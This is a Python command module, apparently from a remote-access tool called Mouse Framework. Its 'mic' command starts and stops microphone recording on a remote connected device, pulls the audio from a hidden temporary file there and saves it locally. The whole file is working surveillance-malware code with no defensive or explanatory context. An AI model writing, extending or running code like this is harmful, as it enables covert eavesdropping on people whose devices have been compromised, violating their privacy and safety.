#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.helper as h
import json
import time
import os

class command:
    def __init__(self):
        self.name = "mic"
        self.description = "Record microphone sound."
        self.usage = "Usage: mic [start|stop <local_path>]"
        
    def run(self,session,cmd_data):
        if not cmd_data['args']:
            print(self.usage)
            return
        else:
            if cmd_data['args'].split()[0] == "start":
                pass
            else:
                if len(cmd_data['args'].split()) < 2 or cmd_data['args'].split()[0] != "stop":
                    print(self.usage)
                    return
		
        if cmd_data['args'].split()[0] == "stop":
            w = os.environ['OLDPWD']
            os.chdir(w)
            dest = cmd_data['args'].split()[1]
            cmd_data['args'] = "stop"
            if os.path.isdir(dest):
                if os.path.exists(dest):
                    h.info_general("Stopping record...")
                    result = json.loads(session.send_command(cmd_data))
                    if 'error' in result:
                        h.info_error("Failed to record mic!")
                        return
                    elif 'status' in result and result['status'] == 1:
                        data = session.download_file("/tmp/.avatmp")
                        f = open(os.path.join(dest,'mic.caf'),'wb')
                        f.write(data)
                        f.close()
                    if dest[-1] == "/":
                        h.info_general("Saving to "+dest+"mic.caf...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"mic.caf!")
                    else:
                        h.info_general("Saving to "+dest+"/mic.caf...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"/mic.caf!")
                else:
                    h.info_error("Local directory: "+dest+": does not exist!")
            else:
                rp = os.path.split(dest)[0]
                if rp == "":
                    rp = "."
                else:
                    pass
                if os.path.exists(rp):
                    if os.path.isdir(rp):
                        pr = os.path.split(dest)[0]
                        rp = os.path.split(dest)[1]
                        h.info_general("Stopping record...")
                        result = json.loads(session.send_command(cmd_data))
                        if 'error' in result:
                            h.info_error("Failed to record mic!")
                            return
                        elif 'status' in result and result['status'] == 1:
                            data = session.download_file("/tmp/.avatmp")
                            f = open(os.path.join(pr,rp),'wb')
                            f.write(data)
                            f.close()
                        h.info_general("Saving to "+dest+"...")
                        time.sleep(1)
                        h.info_success("Saved to "+dest+"!")
                    else:
                        h.info_error("Error: "+rp+": not a directory!")
                else:
                    h.info_error("Local directory: "+rp+": does not exist!")
            g = os.environ['HOME']
            os.chdir(g + "/mouse")

        elif cmd_data['args'].split()[0] == "start":
            cmd_data['args'] = "record"
            h.info_general("Starting record...")
            session.send_command(cmd_data)
